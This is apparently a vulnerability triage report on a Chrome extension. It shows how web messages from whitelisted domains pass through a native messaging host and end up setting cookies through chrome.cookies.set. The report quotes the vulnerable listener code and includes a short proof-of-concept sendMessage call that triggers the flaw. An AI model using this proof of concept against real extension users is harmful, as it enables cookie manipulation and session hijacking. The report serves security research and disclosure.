# CoCo Analysis: hdbenfgeoomkaiddadkoammkpeofpfkj

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1 (bg_chrome_runtime_MessageExternal → chrome_cookies_set_sink)

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_cookies_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/hdbenfgeoomkaiddadkoammkpeofpfkj/opgen_generated_files/bg.js
Line 1052: `request.params = requestFromWeb.params;`
Line 1096: `if (request.method == "proxyRequest" && request.params.url.match(regex)) {`

**Code:**

```javascript
// Background script - External message listener (bg.js)
chrome.runtime.onMessageExternal.addListener(function (requestFromWeb, sender, sendResponse) {
    console.debug("Message from client.js", requestFromWeb, sender);
    var request = {};
    request.method = requestFromWeb.method;  // ← attacker-controlled
    request.params = requestFromWeb.params;  // ← attacker-controlled
    request.sender = {};
    request.sender.url = sender.url;
    request.sender.title = sender.title;
    request.sender.browser = "Chrome";
    request.sender.userAgent = navigator.userAgent;
    request.data = requestFromWeb.data;  // ← attacker-controlled

    console.debug("Sending to host", request);

    // Sends to native messaging host
    chrome.runtime.sendNativeMessage(hostName, request, function (respFromNative) {
        console.debug("Message from host", respFromNative);
        var resp = {};
        resp.type = null;
        resp.error = null;
        resp.data = null;

        if (respFromNative == null || respFromNative.type === "error") {
            // Error handling...
        } else {
            resp.data = respFromNative.data;
            resp.type = respFromNative.type;

            // Vulnerability: Sets cookies based on response from native host
            // which was triggered by attacker-controlled request
            var regex = /^https?:\/\/[^\/]*?\.?(?:set.rn.gov.br|localhost)(?::\d+)?(?:\/|$)/gm;
            try {
                if (request.method == "proxyRequest" && request.params.url.match(regex)) {
                    var cookies = parseSetCookie(JSON.parse(resp.data));
                    if (cookies) {
                        cookies.forEach(function(cookie) {
                            cookie.url = request.params.url;  // ← attacker-controlled URL
                            chrome.cookies.set(cookie, function (setCookie) {  // ← Privileged sink
                                if (chrome.runtime.lastError) {
                                    console.error("Failed to set a cookie:", chrome.runtime.lastError);
                                }
                                if (setCookie) {
                                    console.debug("The cookie has been set successful", setCookie);
                                }
                            });
                        });
                    }
                }
            } catch(err) {
                console.error(err);
            }
        }
        sendResponse(resp);
    });
    return true;
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any website matching *.set.rn.gov.br or localhost
// (allowed by externally_connectable in manifest.json)
chrome.runtime.sendMessage(
    'hdbenfgeoomkaiddadkoammkpeofpfkj',  // extension ID
    {
        method: 'proxyRequest',
        params: {
            url: 'https://example.set.rn.gov.br/path'  // Matches the regex
        },
        data: 'malicious_data'
    },
    function(response) {
        console.log('Cookie set via extension');
    }
);
```

**Impact:** An attacker from whitelisted domains (*.set.rn.gov.br or localhost) can trigger the extension to set arbitrary cookies for any URL matching the regex pattern. While the regex restricts cookie setting to *.set.rn.gov.br and localhost domains, the attacker controls the request.params.url which determines the cookie.url property. The native messaging host processes the attacker-controlled request and returns data that gets parsed as cookies. This allows cookie manipulation on the whitelisted domains, potentially enabling session hijacking or authentication bypass. The extension has the required "cookies" permission in manifest.json.

**Note:** Per the methodology, we IGNORE manifest.json externally_connectable restrictions. Even though only specific domains can trigger this vulnerability, this is classified as TRUE POSITIVE because the code allows chrome.runtime.onMessageExternal and creates an exploitable attack path.
